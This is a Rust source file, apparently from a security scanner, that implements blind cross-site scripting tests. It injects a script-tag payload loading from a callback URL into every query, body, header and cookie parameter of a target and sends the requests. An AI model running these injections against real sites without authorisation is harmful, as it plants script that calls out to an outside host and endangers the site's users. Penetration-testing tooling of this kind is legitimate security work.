use crate::target_parser::Target;

pub async fn blind_scanning(target: &Target, callback_url: &str) {
    let template = crate::payload::XSS_BLIND_PAYLOADS
        .first()
        .copied()
        .unwrap_or("\"'><script src={}></script>");
    let payload = template.replace("{}", callback_url);

    // Collect all params
    let mut all_params = vec![];

    // Query params
    for (k, v) in target.url.query_pairs() {
        all_params.push((k.to_string(), v.to_string(), "query".to_string()));
    }

    // Body params
    if let Some(data) = &target.data {
        for pair in data.split('&') {
            if let Some((k, v)) = pair.split_once('=') {
                all_params.push((k.to_string(), v.to_string(), "body".to_string()));
            }
        }
    }

    // Headers
    for (k, v) in &target.headers {
        all_params.push((k.to_string(), v.to_string(), "header".to_string()));
    }

    // Cookies
    for (k, v) in &target.cookies {
        all_params.push((k.to_string(), v.to_string(), "cookie".to_string()));
    }

    // Send requests for each param
    for (param_name, _, param_type) in all_params {
        send_blind_request(target, &param_name, &payload, &param_type).await;
    }
}

async fn send_blind_request(target: &Target, param_name: &str, payload: &str, param_type: &str) {
    use reqwest::Client;
    use tokio::time::{sleep, Duration};
    use url::form_urlencoded;
    // use global request counter: crate::REQUEST_COUNT

    let client = target.build_client().unwrap_or_else(|_| Client::new());

    let url = match param_type {
        "query" => {
            let mut pairs: Vec<(String, String)> = target
                .url
                .query_pairs()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect();
            let mut found = false;
            for pair in &mut pairs {
                if pair.0 == param_name {
                    pair.1 = payload.to_string();
                    found = true;
                    break;
                }
            }
            if !found {
                pairs.push((param_name.to_string(), payload.to_string()));
            }
            let query = form_urlencoded::Serializer::new(String::new())
                .extend_pairs(&pairs)
                .finish();
            let mut url = target.url.clone();
            url.set_query(Some(&query));
            url
        }
        "body" => target.url.clone(),
        "header" => target.url.clone(),
        "cookie" => target.url.clone(),
        _ => target.url.clone(),
    };

    let mut request = client.request(
        target.method.parse().unwrap_or(reqwest::Method::GET),
        url.clone(),
    );

    let mut headers = target.headers.clone();
    let mut cookies = target.cookies.clone();
    let mut body = target.data.clone();

    match param_type {
        "query" => {
            // Already handled in url
        }
        "body" => {
            if let Some(data) = &target.data {
                // Simple replace, assuming param=value& format
                body = Some(
                    data.replace(
                        &format!("{}=", param_name),
                        &format!("{}={}&", param_name, payload),
                    )
                    .trim_end_matches('&')
                    .to_string(),
                );
            }
        }
        "header" => {
            for (k, v) in &mut headers {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        "cookie" => {
            for (k, v) in &mut cookies {
                if k == param_name {
                    *v = payload.to_string();
                }
            }
        }
        _ => {}
    }

    for (k, v) in &headers {
        request = request.header(k, v);
    }
    if let Some(ua) = &target.user_agent {
        request = request.header("User-Agent", ua);
    }
    let cookie_header = cookies
        .iter()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("; ");
    if !cookie_header.is_empty() {
        request = request.header("Cookie", cookie_header);
    }
    if let Some(b) = &body {
        request = request.body(b.clone());
    }

    // Send the request, ignore response
    crate::REQUEST_COUNT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let _ = request.send().await;

    if target.delay > 0 {
        sleep(Duration::from_millis(target.delay)).await;
    }
}
